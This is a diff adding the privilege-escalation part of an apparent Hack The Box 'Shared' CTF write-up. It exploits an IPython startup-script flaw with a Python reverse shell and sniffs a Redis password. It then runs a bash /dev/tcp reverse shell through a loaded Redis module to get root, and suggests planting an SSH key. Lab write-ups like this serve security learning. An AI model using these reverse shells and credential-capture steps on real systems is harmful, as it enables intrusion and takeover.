@@ -130,8 +130,121 @@ james_mason@shared:/tmp$ ./pspy64
 2022/11/15 17:36:01 CMD: UID=1001 PID=181003 | /usr/bin/python3 /usr/local/bin/ipython 
 ``` 
 
-I don't knwo what /root/c.sh is. But user with uid 1001 (which dan_smith we can get that info from /etc/passwd) kills ipython 
+I don't know what /root/c.sh is. But user with uid 1001 (which dan_smith we can get that info from /etc/passwd) kills ipython 
 and starts it again. Now I'll try to get version of ipython running to then search for vulnerabilities. 
+It is version 8.0.0
+```
+james_mason@shared:~$ ipython
+Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
+Type 'copyright', 'credits' or 'license' for more information
+IPython 8.0.0 -- An enhanced Interactive Python. Type '?' for help.
 
+```
 
+I found this https://github.com/advisories/GHSA-pq7m-3gw7-gq5x.
 
+```
+james_mason@shared:/opt/scripts_review$ mkdir -m 777 -p profile_default/startup
+echo 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.170",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' > profile_default/startup/foo.py
+```
+
+After this we got a shell on our nc listener. I'll grab the key and login in with ssh.
+
+```
+dan_smith@shared:~$ id
+uid=1001(dan_smith) gid=1002(dan_smith) groups=1002(dan_smith),1001(developer),1003(sysadmin)
+```
+
+You can notice that dan is part of the sysadmin group which isn't common. Let's look at files that are owned by this group.
+
+```
+dan_smith@shared:~$ find / -group sysadmin 2>/dev/null
+/usr/local/bin/redis_connector_dev
+dan_smith@shared:~$ file /usr/local/bin/redis_connector_dev
+/usr/local/bin/redis_connector_dev: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go BuildID=sdGIDsCGb51jonJ_67fq/_JkvEmzwH9g6f0vQYeDG/iH1iXHhyzaDZJ056wX9s/7UVi3T2i2LVCU8nXlHgr, not stripped
+```
+
+There is some binary file. I'll download it to my machine to examine it by starting server on the shared box and wget it.
+
+On shared:
+
+```
+dan_smith@shared:/usr/local/bin$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
+On my box:
+
+```
+# wget shared.htb:8000/redis_connector_dev                                                                                              
+```
+
+We can make sure it copied successfully with md5sum
+
+```
+dan_smith@shared:/usr/local/bin$ md5sum redis_connector_dev 
+fd39ad209c9e2f4065427b6d5a04c904  redis_connector_dev
+```
+Another way to get it would be with scp since we have ssh key.
+Let's try to use it. We need to start listener on our box. 
+
+```
+# chmod +x redis_connector_dev 
+# ./redis_connector_dev localhost
+[+] Logging to redis instance using password...
+
+INFO command result:
+ i/o timeout
+```
+
+```
+└─# nc -lvnp 6379
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::6379
+Ncat: Listening on 0.0.0.0:6379
+Ncat: Connection from ::1.
+Ncat: Connection from ::1:60554.
+*2
+$4
+auth
+$16
+F2WHqJUz2WEz=Gqq
+
+```
+We get some string that looks like a password. Trying to login as root with it doesn't work. 
+There is a way to get command execution from redis-cli.(https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis). Cloning the repository and making the module and transfering it to dan home directory
+and loading it in redis-cli gives us the ability to execute arbitrary system commands as we can see below:
+
+```
+dan_smith@shared:/tmp$ redis-cli
+127.0.0.1:6379> AUTH F2WHqJUz2WEz=Gqq
+OK
+127.0.0.1:6379> MODULE LOAD /home/dan_smith/module.so
+OK
+127.0.0.1:6379> system.exec "bash -c 'bash -i >& /dev/tcp/10.10.14.197/4444 0>&1'"
+```
+
+On our listener:
+
+```
+# nc -lvnp 4444
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.11.172.
+Ncat: Connection from 10.10.11.172:56842.
+bash: cannot set terminal process group (110793): Inappropriate ioctl for device
+bash: no job control in this shell
+root@shared:/var/lib/redis# cd /root
+cd /root
+root@shared:~# cat root.txt
+cat root.txt
+69701d219d33280e2********
+```
+
+The connection on from redis as well as the authentication is dying pretty quickly so we need to be quick.
+To stabilize that you can upload id_rsa key to root .ssh directory and get proper shell that wouldn't be dying
+every few seconds. Either way we got flag and sucesfully finished the box.
+
+Thank you for reading this write up. If you have question or suggestions or want someone to play ctfs with 
+you can hit me up on Twitter(https://twitter.com/Vojtech1337) or wherever you can. 
